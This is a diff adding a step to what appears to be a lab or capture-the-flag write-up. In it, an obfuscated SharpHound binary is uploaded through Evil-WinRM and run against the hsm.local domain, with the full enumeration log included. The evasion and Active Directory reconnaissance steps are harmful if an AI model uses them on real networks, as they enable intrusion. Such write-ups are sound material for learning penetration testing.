@@ -619,5 +619,31 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\bbarkinson\Documents> upload SharpHound.exe._obf.exe
 ```
-So ill start by using an obfuscated version of sharphound found below:
+So ill start by using an obfuscated version of sharphound found below since reguila:
+
+https://github.com/Flangvik/ObfuscatedSharpCollection/blob/main/NetFramework_4.7_Any/SharpHound.exe._obf.exe
+
+```python
+*Evil-WinRM* PS C:\Users\bbarkinson\Documents> ./SharpHound.exe._obf.exe --CollectionMethods All --ZipFileName output.zip
+2026-03-17T17:03:52.0249885+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2026-03-17T17:03:52.6544701+00:00|INFORMATION|Initializing SharpHound at 5:03 PM on 3/17/2026
+2026-03-17T17:03:53.1131408+00:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for hsm.local : DC01.hsm.local
+2026-03-17T17:03:53.2123640+00:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2026-03-17T17:03:53.6133394+00:00|INFORMATION|Beginning LDAP search for hsm.local
+2026-03-17T17:03:53.7679228+00:00|INFORMATION|Producer has finished, closing LDAP channel
+2026-03-17T17:03:53.7716090+00:00|INFORMATION|LDAP channel closed, waiting for consumers
+2026-03-17T17:04:23.7726447+00:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 39 MB RAM
+2026-03-17T17:04:38.3709103+00:00|INFORMATION|Consumers finished, closing output channel
+2026-03-17T17:04:38.4461679+00:00|INFORMATION|Output channel closed, waiting for output task to complete
+Closing writers
+2026-03-17T17:04:38.6146246+00:00|INFORMATION|Status: 96 objects finished (+96 2.133333)/s -- Using 47 MB RAM
+2026-03-17T17:04:38.6146246+00:00|INFORMATION|Enumeration finished in 00:00:45.0077449
+2026-03-17T17:04:38.9164070+00:00|INFORMATION|Saving cache with stats: 55 ID to type mappings.
+ 56 name to SID mappings.
+ 0 machine sid mappings.
+ 2 sid to domain mappings.
+ 0 global catalog mappings.
+2026-03-17T17:04:38.9363408+00:00|INFORMATION|SharpHound Enumeration Completed at 5:04 PM on 3/17/2026! Happy Graphing!
+```
+This made a .zip file for me which i can download then upload to bloodhound
 
